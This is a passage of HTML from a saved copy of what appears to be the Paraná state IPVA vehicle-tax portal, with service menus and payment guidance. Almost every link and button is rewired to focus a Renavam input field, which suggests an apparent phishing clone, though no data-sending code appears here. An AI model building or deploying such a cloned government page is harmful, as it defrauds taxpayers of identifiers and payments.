                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x16o">
                                                                                                                                                        <div
                                                                                                                                                            class="x17l">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x15y">
                                                                                                                                                        <div
                                                                                                                                                            class="x17l">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                </tr>
                                                                                                                                            </tbody>
                                                                                                                                        </table>
                                                                                                                                    </div>
                                                                                                                                </td>
                                                                                                                            </tr>
                                                                                                                            <tr>
                                                                                                                                <td class="x21h"
                                                                                                                                    id="pt1:r1:0:m3::sDwnBg">
                                                                                                                                    <div id="pt1:r1:0:m3::ScrollDown"
                                                                                                                                        class="x16h"
                                                                                                                                        style="display:none">
                                                                                                                                        <span
                                                                                                                                            class="x16i"></span>
                                                                                                                                    </div>
                                                                                                                                </td>
                                                                                                                            </tr>
                                                                                                                        </tbody>
                                                                                                                    </table>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                            <tr id="pt1:r1:0:m4"
                                                                                                                class="menu-drop x15z x16l"
                                                                                                                _afrdth="2"
                                                                                                                _afrgrp="0"
                                                                                                                data-afr-fcs="true"
                                                                                                                tabindex="-1"
                                                                                                                role="menuitem"
                                                                                                                aria-haspopup="true">
                                                                                                                <td
                                                                                                                    class="x16i">
                                                                                                                    <div
                                                                                                                        class="x178">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16t">
                                                                                                                    Parcelamento
                                                                                                                    IPVA
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16u">
                                                                                                                    <div
                                                                                                                        class="x178">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x15x">
                                                                                                                    <div
                                                                                                                        class="x16y">
                                                                                                                    </div>
                                                                                                                    <table
                                                                                                                        cellpadding="0"
                                                                                                                        cellspacing="0"
                                                                                                                        border="0"
                                                                                                                        summary=""
                                                                                                                        role="menu"
                                                                                                                        class="x16f"
                                                                                                                        id="pt1:r1:0:m4::menu">
                                                                                                                        <tbody>
                                                                                                                            <tr>
                                                                                                                                <td class="x21g p_AFDisabled"
                                                                                                                                    id="pt1:r1:0:m4::sUpBg">
                                                                                                                                    <div id="pt1:r1:0:m4::ScrollUp"
                                                                                                                                        class="x16g p_AFDisabled"
                                                                                                                                        style="display:none">
                                                                                                                                        <span
                                                                                                                                            class="x16i"></span>
                                                                                                                                    </div>
                                                                                                                                </td>
                                                                                                                            </tr>
                                                                                                                            <tr>
                                                                                                                                <td>
                                                                                                                                    <div id="pt1:r1:0:m4::ScrollBox"
                                                                                                                                        class="x17k">
                                                                                                                                        <table
                                                                                                                                            cellpadding="0"
                                                                                                                                            cellspacing="0"
                                                                                                                                            border="0"
                                                                                                                                            width="100%"
                                                                                                                                            summary=""
                                                                                                                                            role="presentation"
                                                                                                                                            id="pt1:r1:0:m4::ScrollContent"
                                                                                                                                            class="x21f">
                                                                                                                                            <tbody>
                                                                                                                                                <tr id="pt1:r1:0:cmi12"
                                                                                                                                                    class="menu-content x16a x16k"
                                                                                                                                                    _afrdth="3"
                                                                                                                                                    _afrgrp="0"
                                                                                                                                                    data-afr-fcs="true"
                                                                                                                                                    tabindex="-1"
                                                                                                                                                    role="menuitem">
                                                                                                                                                    <td
                                                                                                                                                        class="x16p">
                                                                                                                                                        <div
                                                                                                                                                            class="x17m">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x16q">
                                                                                                                                                        Parcelar
                                                                                                                                                        por
                                                                                                                                                        Renavam
                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x16r">
                                                                                                                                                        <div
                                                                                                                                                            class="x17m">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x16s">
                                                                                                                                                        <div
                                                                                                                                                            class="x17m">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                </tr>
                                                                                                                                                <tr id="pt1:r1:0:gmi10"
                                                                                                                                                    class="x16a x16k"
                                                                                                                                                    _afrdth="3"
                                                                                                                                                    _afrgrp="0"
                                                                                                                                                    data-afr-fcs="true"
                                                                                                                                                    tabindex="-1"
                                                                                                                                                    role="menuitem">
                                                                                                                                                    <td
                                                                                                                                                        class="x16p">
                                                                                                                                                        <div
                                                                                                                                                            class="x17m">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x16q">
                                                                                                                                                        Parcelar
                                                                                                                                                        Dívida
                                                                                                                                                        Ativa
                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x16r">
                                                                                                                                                        <div
                                                                                                                                                            class="x17m">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x16s">
                                                                                                                                                        <div
                                                                                                                                                            class="x17m">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                </tr>
                                                                                                                                            </tbody>
                                                                                                                                        </table>
                                                                                                                                    </div>
                                                                                                                                </td>
                                                                                                                            </tr>
                                                                                                                            <tr>
                                                                                                                                <td class="x21h"
                                                                                                                                    id="pt1:r1:0:m4::sDwnBg">
                                                                                                                                    <div id="pt1:r1:0:m4::ScrollDown"
                                                                                                                                        class="x16h"
                                                                                                                                        style="display:none">
                                                                                                                                        <span
                                                                                                                                            class="x16i"></span>
                                                                                                                                    </div>
                                                                                                                                </td>
                                                                                                                            </tr>
                                                                                                                        </tbody>
                                                                                                                    </table>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                            <tr id="pt1:r1:0:m5"
                                                                                                                class="menu-drop x15z x16l"
                                                                                                                _afrdth="2"
                                                                                                                _afrgrp="0"
                                                                                                                data-afr-fcs="true"
                                                                                                                tabindex="-1"
                                                                                                                role="menuitem"
                                                                                                                aria-haspopup="true">
                                                                                                                <td
                                                                                                                    class="x16i">
                                                                                                                    <div
                                                                                                                        class="x178">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16t">
                                                                                                                    Regularização
                                                                                                                    de
                                                                                                                    Débitos
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16u">
                                                                                                                    <div
                                                                                                                        class="x178">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x15x">
                                                                                                                    <div
                                                                                                                        class="x16y">
                                                                                                                    </div>
                                                                                                                    <table
                                                                                                                        cellpadding="0"
                                                                                                                        cellspacing="0"
                                                                                                                        border="0"
                                                                                                                        summary=""
                                                                                                                        role="menu"
                                                                                                                        class="x16f"
                                                                                                                        id="pt1:r1:0:m5::menu">
                                                                                                                        <tbody>
                                                                                                                            <tr>
                                                                                                                                <td class="x21g p_AFDisabled"
                                                                                                                                    id="pt1:r1:0:m5::sUpBg">
                                                                                                                                    <div id="pt1:r1:0:m5::ScrollUp"
                                                                                                                                        class="x16g p_AFDisabled"
                                                                                                                                        style="display:none">
                                                                                                                                        <span
                                                                                                                                            class="x16i"></span>
                                                                                                                                    </div>
                                                                                                                                </td>
                                                                                                                            </tr>
                                                                                                                            <tr>
                                                                                                                                <td>
                                                                                                                                    <div id="pt1:r1:0:m5::ScrollBox"
                                                                                                                                        class="x17k">
                                                                                                                                        <table
                                                                                                                                            cellpadding="0"
                                                                                                                                            cellspacing="0"
                                                                                                                                            border="0"
                                                                                                                                            width="100%"
                                                                                                                                            summary=""
                                                                                                                                            role="presentation"
                                                                                                                                            id="pt1:r1:0:m5::ScrollContent"
                                                                                                                                            class="x21f">
                                                                                                                                            <tbody>
                                                                                                                                                <tr id="pt1:r1:0:cmi8"
                                                                                                                                                    class="menu-content x169 x16j"
                                                                                                                                                    onclick="ID('renavam').focus()"
                                                                                                                                                    _afrdth="3"
                                                                                                                                                    _afrgrp="0"
                                                                                                                                                    data-afr-fcs="true"
                                                                                                                                                    tabindex="-1"
                                                                                                                                                    role="menuitem"
                                                                                                                                                    aria-haspopup="true">
                                                                                                                                                    <td
                                                                                                                                                        class="x16m">
                                                                                                                                                        <div
                                                                                                                                                            class="x17l">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x16n">
                                                                                                                                                        Veículo
                                                                                                                                                        arrematado
                                                                                                                                                        em
                                                                                                                                                        leilão
                                                                                                                                                        da
                                                                                                                                                        Receita
                                                                                                                                                        Federal
                                                                                                                                                        do
                                                                                                                                                        Brasil
                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x16o">
                                                                                                                                                        <div
                                                                                                                                                            class="x17l">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x15y">
                                                                                                                                                        <div
                                                                                                                                                            class="x17l">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                </tr>
                                                                                                                                                <tr id="pt1:r1:0:cmi9"
                                                                                                                                                    class="menu-content x169 x16j"
                                                                                                                                                    onclick="ID('renavam').focus()"
                                                                                                                                                    _afrdth="3"
                                                                                                                                                    _afrgrp="0"
                                                                                                                                                    data-afr-fcs="true"
                                                                                                                                                    tabindex="-1"
                                                                                                                                                    role="menuitem"
                                                                                                                                                    aria-haspopup="true">
                                                                                                                                                    <td
                                                                                                                                                        class="x16m">
                                                                                                                                                        <div
                                                                                                                                                            class="x17l">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x16n">
                                                                                                                                                        Veículo
                                                                                                                                                        arrematado
                                                                                                                                                        em
                                                                                                                                                        leilão
                                                                                                                                                        de
                                                                                                                                                        órgãos
                                                                                                                                                        de
                                                                                                                                                        trânsito
                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x16o">
                                                                                                                                                        <div
                                                                                                                                                            class="x17l">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x15y">
                                                                                                                                                        <div
                                                                                                                                                            class="x17l">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                </tr>
                                                                                                                                            </tbody>
                                                                                                                                        </table>
                                                                                                                                    </div>
                                                                                                                                </td>
                                                                                                                            </tr>
                                                                                                                            <tr>
                                                                                                                                <td class="x21h"
                                                                                                                                    id="pt1:r1:0:m5::sDwnBg">
                                                                                                                                    <div id="pt1:r1:0:m5::ScrollDown"
                                                                                                                                        class="x16h"
                                                                                                                                        style="display:none">
                                                                                                                                        <span
                                                                                                                                            class="x16i"></span>
                                                                                                                                    </div>
                                                                                                                                </td>
                                                                                                                            </tr>
                                                                                                                        </tbody>
                                                                                                                    </table>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                            <tr id="pt1:r1:0:m6"
                                                                                                                class="menu-content x169 x16j"
                                                                                                                onclick="ID('renavam').focus()"
                                                                                                                _afrdth="2"
                                                                                                                _afrgrp="0"
                                                                                                                data-afr-fcs="true"
                                                                                                                tabindex="-1"
                                                                                                                role="menuitem">
                                                                                                                <td
                                                                                                                    class="x16m">
                                                                                                                    <div
                                                                                                                        class="x17l">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16n">
                                                                                                                    Restituição
                                                                                                                    de
                                                                                                                    Pagamento
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16o">
                                                                                                                    <div
                                                                                                                        class="x17l">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x15y">
                                                                                                                    <div
                                                                                                                        class="x17l">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                            <tr id="pt1:r1:0:m7"
                                                                                                                class="menu-content x169 x16j"
                                                                                                                onclick="ID('renavam').focus()"
                                                                                                                _afrdth="2"
                                                                                                                _afrgrp="0"
                                                                                                                data-afr-fcs="true"
                                                                                                                tabindex="-1"
                                                                                                                role="menuitem">
                                                                                                                <td
                                                                                                                    class="x16m">
                                                                                                                    <div
                                                                                                                        class="x17l">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16n">
                                                                                                                    Retificação
                                                                                                                    de
                                                                                                                    Pagamento
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16o">
                                                                                                                    <div
                                                                                                                        class="x17l">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x15y">
                                                                                                                    <div
                                                                                                                        class="x17l">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                            <tr id="pt1:r1:0:cmi16"
                                                                                                                class="menu-content x169 x16j"
                                                                                                                onclick="ID('renavam').focus()"
                                                                                                                _afrdth="2"
                                                                                                                _afrgrp="0"
                                                                                                                data-afr-fcs="true"
                                                                                                                tabindex="-1"
                                                                                                                role="menuitem"
                                                                                                                aria-haspopup="true">
                                                                                                                <td
                                                                                                                    class="x16m">
                                                                                                                    <div
                                                                                                                        class="x17l">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16n">
                                                                                                                    Revisão
                                                                                                                    de
                                                                                                                    Valor
                                                                                                                    Venal
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16o">
                                                                                                                    <div
                                                                                                                        class="x17l">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x15y">
                                                                                                                    <div
                                                                                                                        class="x17l">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                            <tr id="pt1:r1:0:cmi5"
                                                                                                                class="menu-content x169 x16j"
                                                                                                                onclick="ID('renavam').focus()"
                                                                                                                _afrdth="2"
                                                                                                                _afrgrp="0"
                                                                                                                data-afr-fcs="true"
                                                                                                                tabindex="-1"
                                                                                                                role="menuitem"
                                                                                                                aria-haspopup="true">
                                                                                                                <td
                                                                                                                    class="x16m">
                                                                                                                    <div
                                                                                                                        class="x17l">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16n">
                                                                                                                    Consultar
                                                                                                                    Débitos
                                                                                                                    CPF
                                                                                                                    /
                                                                                                                    CNPJ
                                                                                                                    -
                                                                                                                    IPVA
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16o">
                                                                                                                    <div
                                                                                                                        class="x17l">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x15y">
                                                                                                                    <div
                                                                                                                        class="x17l">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                        </tbody>
                                                                                                    </table>
                                                                                                </div>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td class="x21h"
                                                                                                id="pt1:r1:0:m2::sDwnBg">
                                                                                                <div id="pt1:r1:0:m2::ScrollDown"
                                                                                                    class="x16h"
                                                                                                    style="display:none">
                                                                                                    <span
                                                                                                        class="x16i"></span>
                                                                                                </div>
                                                                                            </td>
                                                                                        </tr>
                                                                                    </tbody>
                                                                                </table>
                                                                            </div>
                                                                        </td>
                                                                    </tr>
                                                                </tbody>
                                                            </table>
                                                        </div>
                                                        <div id="pt1:r1:0:mb2::eoi" class="xlk" title="Overflow"
                                                            aria-label="Overflow" role="menuitem" aria-haspopup="true"
                                                            data-afr-fcs="true" tabindex="-1">
                                                            <div id="pt1:r1:0:mb2::eoc" class="xlw" role="menu"></div>
                                                        </div>
                                                    </div>
                                                    <div class="xnd"></div>
                                                </div>
                                            </span></td>
                                        <td><span id="pt1:r1:0:gc5" class="x1a">
                                                <div id="pt1:r1:0:b12" class="x25e xfl p_AFTextOnly" _afrgrp="0"
                                                    role="presentation"><a onclick="ID('renavam').focus()"
                                                        data-afr-fcs="true" class="xfn" role="button"><span
                                                            class="xfv">Legislação</span></a></div>
                                            </span></td>
                                        <td><span id="pt1:r1:0:gc6" class="x1a">
                                                <div id="pt1:r1:0:b13" class="x25e xfl p_AFTextOnly" style=""
                                                    _afrgrp="0" role="presentation"><a onclick="ID('renavam').focus()"
                                                        data-afr-fcs="true" class="xfn" role="button"><span
                                                            class="xfv">Ajuda</span></a>
                                                </div>
                                            </span></td>
                                    </tr>
                                </tbody>
                            </table>
                            <div id="pt1:r1:0:pgl12" class="x295 xsz x27d x1a boxmenuf">
                                <div><span id="pt1:r1:0:pgl21" class="x1a">
                                        <div id="pt1:r1:0:btnVoltSobr2" class="x25f xfl p_AFTextOnly" _afrgrp="0"
                                            role="presentation"><a onclick="ID('renavam').focus()" data-afr-fcs="true"
                                                class="xfn" role="button" aria-pressed="false"><span class="xfv">Sobre o
                                                    IPVA</span></a></div>
                                    </span></div>
                                <div><span id="pt1:r1:0:pgl0" class="x1a">
                                        <div role="group" id="pt1:r1:0:pa1" class="x1b p_AFFlow"
                                            style="margin-right: 17px; width: 95%;;height:auto"><a
                                                aria-label="Mostrar painéis anteriores" onclick="ID('renavam').focus()"
                                                class="x1bj" id="pt1:r1:0:pa1::overflowTop"
                                                title="Mostrar painéis anteriores" tabindex="0"><img
                                                    src="./PortalPVAPR_files/overflow_top.png" border="0" alt=""></a>
                                            <h1 id="pt1:r1:0:sdi1::head" class="x1bn p_AFDisclosable p_AFFlow"
                                                style="height: 48px; ">
                                                <table cellpadding="0" cellspacing="0" border="0" width="100%"
                                                    summary="" role="presentation" height="100%">
                                                    <tbody>
                                                        <tr>
                                                            <td id="pt1:r1:0:sdi1::btn" class="x1bp"><a role="button"
                                                                    _afrpakey="pt1:r1:0:sdi1" _afrevttp="disclosure"
                                                                    _afrdscl="false" aria-expanded="false"
                                                                    id="pt1:r1:0:sdi1::disAcr" aria-label="Consultas"
                                                                    href="javascript:;" class="x1bt"><img
                                                                        src="./PortalPVAPR_files/disclosure_collapsed.png"
                                                                        border="0" alt=""></a></td>
                                                            <td class="x1bs">
                                                                <table cellpadding="0" cellspacing="0" border="0"
                                                                    width="100%" summary="" role="presentation">
                                                                    <tbody>
                                                                        <tr>
                                                                            <td></td>
                                                                            <td><span
                                                                                    style="white-space: nowrap">Consultas</span>
                                                                            </td>
                                                                        </tr>
                                                                    </tbody>
                                                                </table>
                                                            </td>
                                                            <td align="right" _afrtbr="true" class="x17t">&nbsp;</td>
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </h1>
                                            <div _afrpakey="pt1:r1:0:sdi1" id="pt1:r1:0:sdi1::body"
                                                style="display:none">
                                                <div id="pt1:r1:0:sdi1" class="af_showDetailItem"
                                                    style="margin-left: 30px;"></div>
                                            </div>
                                            <h1 id="pt1:r1:0:sdi6::head" class="x1bo p_AFDisclosable p_AFFlow"
                                                style="height: 49px; ">
                                                <table cellpadding="0" cellspacing="0" border="0" width="100%"
                                                    summary="" role="presentation" height="100%">
                                                    <tbody>
                                                        <tr>
                                                            <td id="pt1:r1:0:sdi6::btn" class="x1bp"><a role="button"
                                                                    _afrpakey="pt1:r1:0:sdi6" _afrevttp="disclosure"
                                                                    _afrdscl="false" aria-expanded="false"
                                                                    id="pt1:r1:0:sdi6::disAcr" aria-label="Serviços"
                                                                    href="javascript:;" class="x1bt"><img
                                                                        src="./PortalPVAPR_files/disclosure_collapsed.png"
                                                                        border="0" alt=""></a></td>
                                                            <td class="x1bs">
                                                                <table cellpadding="0" cellspacing="0" border="0"
                                                                    width="100%" summary="" role="presentation">
                                                                    <tbody>
                                                                        <tr>
                                                                            <td></td>
                                                                            <td><span
                                                                                    style="white-space: nowrap">Serviços</span>
                                                                            </td>
                                                                        </tr>
                                                                    </tbody>
                                                                </table>
                                                            </td>
                                                            <td align="right" _afrtbr="true" class="x17t">&nbsp;</td>
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </h1>
                                            <div _afrpakey="pt1:r1:0:sdi6" id="pt1:r1:0:sdi6::body"
                                                style="display:none">
                                                <div id="pt1:r1:0:sdi6" class="af_showDetailItem"
                                                    style="margin-left: 30px;"></div>
                                            </div>
                                            <div id="pt1:r1:0:pa1::optimizedData" style="display:none"></div><a
                                                aria-label="Mostrar próximos painéis" onclick="ID('renavam').focus()"
                                                class="x1bk" id="pt1:r1:0:pa1::overflowBottom"
                                                title="Mostrar próximos painéis" tabindex="0"><img
                                                    src="./PortalPVAPR_files/overflow_bottom.png" border="0" alt=""></a>
                                            <div id="pt1:r1:0:pa1::overflowMenuHolder" style="display:none">
                                                <div id="pt1:r1:0:pa1_afrP" style="display:none">
                                                    <div style="top:auto;right:auto;left:auto;bottom:auto;width:auto;height:auto;position:relative;"
                                                        id="pt1:r1:0:pa1_afrP::content">
                                                        <div id="pt1:r1:0:pa1Menu" class="x1bl x1a">
                                                            <div><a data-afr-tlen="9" id="pt1:r1:0:pa1_afrCl0"
                                                                    class="xdj xgl" onclick="ID('renavam').focus()"
                                                                    data-afr-fcs="true">Consultas</a>
                                                            </div>
                                                            <div><a data-afr-tlen="8" id="pt1:r1:0:pa1_afrCl1"
                                                                    class="xdj xgl" onclick="ID('renavam').focus()"
                                                                    data-afr-fcs="true">Serviços</a>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div id="pt1:r1:0:pa1::dropTarget"
                                                class="p_AFDropTarget af_panelAccordion_drop-target"
                                                style="display:none"></div>
                                        </div>
                                    </span></div>
                                <div><span id="pt1:r1:0:pgl17" class="x1a">
                                        <div id="pt1:r1:0:b3" class="x25e xfl p_AFTextOnly" _afrgrp="0"
                                            role="presentation"><a onclick="ID('renavam').focus()" data-afr-fcs="true"
                                                class="xfn" role="button"><span class="xfv">Legislação</span></a></div>
                                    </span></div>
                                <div><span id="pt1:r1:0:pgl22" class="x1a">
                                        <div id="pt1:r1:0:b4" class="x25e xfl p_AFTextOnly" style="" _afrgrp="0"
                                            role="presentation"><a onclick="ID('renavam').focus()" data-afr-fcs="true"
                                                class="xfn" role="button"><span class="xfv">Ajuda</span></a></div>
                                    </span></div>
                            </div>
                            <div id="pt1:r1:0:s1" style="margin-top:20px"></div><span id="pt1:r1:0:pgl1"
                                style="justify-content: center;display: grid;" class="xsz x1a">
                                <table cellpadding="0" cellspacing="0" border="0" summary="" role="presentation"
                                    id="pt1:r1:0:pgl14" class="x1a">
                                    <tbody>
                                        <tr>
                                            <td valign="top" class="SobreoIPVA">
                                                <div id="pt1:r1:0:pgl13" class="content=100 x1a"
                                                    style="margin-right: 40px;margin-left: 20px;">
                                                    <div><span class="x23z">Sobre o IPVA</span></div>
                                                    <div><img id="pt1:r1:0:s7" src="./PortalPVAPR_files/t.gif" alt=""
                                                            width="10" height="10" style="vertical-align:middle;"></div>
                                                    <div>
                                                        <table cellpadding="0" cellspacing="0" border="0" summary=""
                                                            role="presentation" id="pt1:r1:0:pgl15" class="x1a">
                                                            <tbody>
                                                                <tr>
                                                                    <td valign="middle"><span class="x250"
                                                                            style="margin-right: 40px;">Trata-se de
                                                                            imposto estadual lançado anualmente, que
                                                                            destina 50% para o município de emplacamento
                                                                            do veículo. Sua arrecadação é utilizada para
                                                                            custear os gastos públicos, como educação,
                                                                            saúde, segurança e transporte.</span></td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </div>
                                                    <div><img id="pt1:r1:0:s10" src="./PortalPVAPR_files/t.gif" alt=""
                                                            width="10" height="10" style="vertical-align:middle;"></div>
                                                    <div><span id="pt1:r1:0:pgl161" class="x1a"><span class="x250">Para
                                                                veículos adquiridos em anos anteriores, a cobrança do
                                                                imposto se inicia em janeiro e a alíquota é de 3,5% ou
                                                                1% do valor do veículo, podendo ser quitado à vista (com
                                                                bonificação de 6%) ou em até cinco
                                                                parcelas.</span></span></div>
                                                    <div><img id="pt1:r1:0:s101" src="./PortalPVAPR_files/t.gif" alt=""
                                                            width="10" height="10" style="vertical-align:middle;"></div>
                                                    <div><span id="pt1:r1:0:pgl1612" class="x1a"><span class="x250">Se
                                                                estiverem vencidos, os débitos do ano corrente devem ser
                                                                quitados em uma única cota. Os débitos vencidos de anos
                                                                anteriores podem ser parcelados.</span></span></div>
                                                    <div><img id="pt1:r1:0:s1012" src="./PortalPVAPR_files/t.gif" alt=""
                                                            width="10" height="10" style="vertical-align:middle;"></div>
                                                    <div><span id="pt1:r1:0:pgl3" class="x1a"><span class="x24e">Como
                                                                pagar o IPVA:</span></span></div>
                                                    <div><img id="pt1:r1:0:s11" src="./PortalPVAPR_files/t.gif" alt=""
                                                            width="10" height="10" style="vertical-align:middle;"></div>
                                                    <div><span id="pt1:r1:0:pgl5" class="x1a"><img id="pt1:r1:0:i3"
                                                                class="xl0" src="./PortalPVAPR_files/icon_mark.png"><img
                                                                id="pt1:r1:0:s6" src="./PortalPVAPR_files/t.gif" alt=""
                                                                width="10" height="10"
                                                                style="vertical-align:middle;"><span class="x250"> As
                                                                guias para pagamento estão disponíveis em </span><span
                                                                class="x250" style="font-weight: bold;">"Consultar
                                                                Débitos e Guias para pagar o IPVA/PR"</span><span
                                                                class="x250">, acessado com o número do </span><span
                                                                class="x250"
                                                                style="font-weight: bold;">Renavam;</span></span></div>
                                                    <div><img id="pt1:r1:0:s12" src="./PortalPVAPR_files/t.gif" alt=""
                                                            width="10" height="10" style="vertical-align:middle;"></div>
                                                    <div><span id="pt1:r1:0:pgl51" class="x1a"><img id="pt1:r1:0:i31"
                                                                class="xl0" src="./PortalPVAPR_files/icon_mark.png"><img
                                                                id="pt1:r1:0:s61" src="./PortalPVAPR_files/t.gif" alt=""
                                                                width="10" height="10"
                                                                style="vertical-align:middle;"><span class="x250"
                                                                style="font-weight: bold;">O IPVA pode ser pago por meio
                                                                de:</span></span></div>
                                                    <div><img id="pt1:r1:0:s13" src="./PortalPVAPR_files/t.gif" alt=""
                                                            width="10" height="10" style="vertical-align:middle;"></div>
                                                    <div>
                                                        <table cellpadding="0" cellspacing="0" border="0" summary=""
                                                            role="presentation" id="pt1:r1:0:pgl52" class="x1a"
                                                            style="padding-left:20px;">
                                                            <tbody>
                                                                <tr>
                                                                    <td valign="middle"><img id="pt1:r1:0:i32"
                                                                            class="xl0"
                                                                            style="vertical-align: top !important;"
                                                                            src="./PortalPVAPR_files/icon_mark.png">
                                                                    </td>
                                                                    <td valign="middle"><img id="pt1:r1:0:s62"
                                                                            src="./PortalPVAPR_files/t.gif" alt=""
                                                                            width="10" height="10"
                                                                            style="vertical-align:middle;"></td>
                                                                    <td valign="middle"><span class="x250">GR-PR (Guia
                                                                            de Recolhimento do Estado do Paraná) nos
                                                                            bancos credenciados (Banco do Brasil,
                                                                            Bradesco, Bancoob, Rendimento, Santander,
                                                                            Itaú e Sicredi) para quaisquer exercícios
                                                                            pendentes de IPVA;</span></td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </div>
                                                    <div><img id="pt1:r1:0:s143" src="./PortalPVAPR_files/t.gif" alt=""
                                                            width="10" height="10" style="vertical-align:middle;"></div>
                                                    <div>
                                                        <table cellpadding="0" cellspacing="0" border="0" summary=""
                                                            role="presentation" id="pt1:r1:0:pgl54" class="x1a"
                                                            style="padding-left:20px;">
                                                            <tbody>
                                                                <tr>
                                                                    <td valign="middle"><img id="pt1:r1:0:i34"
                                                                            class="xl0"
                                                                            src="./PortalPVAPR_files/icon_mark.png">
                                                                    </td>
                                                                    <td valign="middle"><img id="pt1:r1:0:s64"
                                                                            src="./PortalPVAPR_files/t.gif" alt=""
                                                                            width="10" height="10"
                                                                            style="vertical-align:middle;"></td>
                                                                    <td valign="middle"><span class="x250">Apenas com o
                                                                            nº de Renavam do veículo, nas agências ou
                                                                            nos caixas automáticos dos bancos
                                                                            credenciados (com exceção do Banco do
                                                                            Brasil).</span></td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </div>
                                                    <div><img id="pt1:r1:0:s9" src="./PortalPVAPR_files/t.gif" alt=""
                                                            width="10" height="10" style="vertical-align:middle;"></div>
                                                    <div>
                                                        <table cellpadding="0" cellspacing="0" border="0" summary=""
                                                            role="presentation" id="pt1:r1:0:pgl11" class="x1a"
                                                            style="padding-left:20px;">
                                                            <tbody>
                                                                <tr>
                                                                    <td valign="middle"><img id="pt1:r1:0:i2"
                                                                            class="xl0"
                                                                            src="./PortalPVAPR_files/icon_mark.png">
                                                                    </td>
                                                                    <td valign="middle"><img id="pt1:r1:0:s8"
                                                                            src="./PortalPVAPR_files/t.gif" alt=""
                                                                            width="10" height="10"
                                                                            style="vertical-align:middle;"></td>
                                                                    <td valign="middle"><span class="x250">Pagamento via
                                                                            PIX, por meio de QR-CODE em GR-PR disponível
                                                                            no portal público.</span></td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </div>
                                                    <div><img id="pt1:r1:0:s14" src="./PortalPVAPR_files/t.gif" alt=""
                                                            width="10" height="10" style="vertical-align:middle;"></div>
                                                    <div>
                                                        <table cellpadding="0" cellspacing="0" border="0" summary=""
                                                            role="presentation" id="pt1:r1:0:pgl24" class="x1a"
                                                            style="padding-left:20px;">
                                                            <tbody>
                                                                <tr>
                                                                    <td valign="middle"><img id="pt1:r1:0:i4"
                                                                            class="xl0"
                                                                            src="./PortalPVAPR_files/icon_mark.png">
                                                                    </td>
                                                                    <td valign="middle"><img id="pt1:r1:0:s16"
                                                                            src="./PortalPVAPR_files/t.gif" alt=""
                                                                            width="10" height="10"
                                                                            style="vertical-align:middle;"></td>
                                                                    <td valign="middle"><span id="pt1:r1:0:pgl25"
                                                                            class="x1a"><span class="x250">Consulta ao
                                                                                aplicativo Receita Paraná para pagamento
                                                                                via PIX, GR-PR e cartão de crédito -
                                                                                download do aplicativo </span><img
                                                                                id="pt1:r1:0:s17"
                                                                                src="./PortalPVAPR_files/t.gif" alt=""
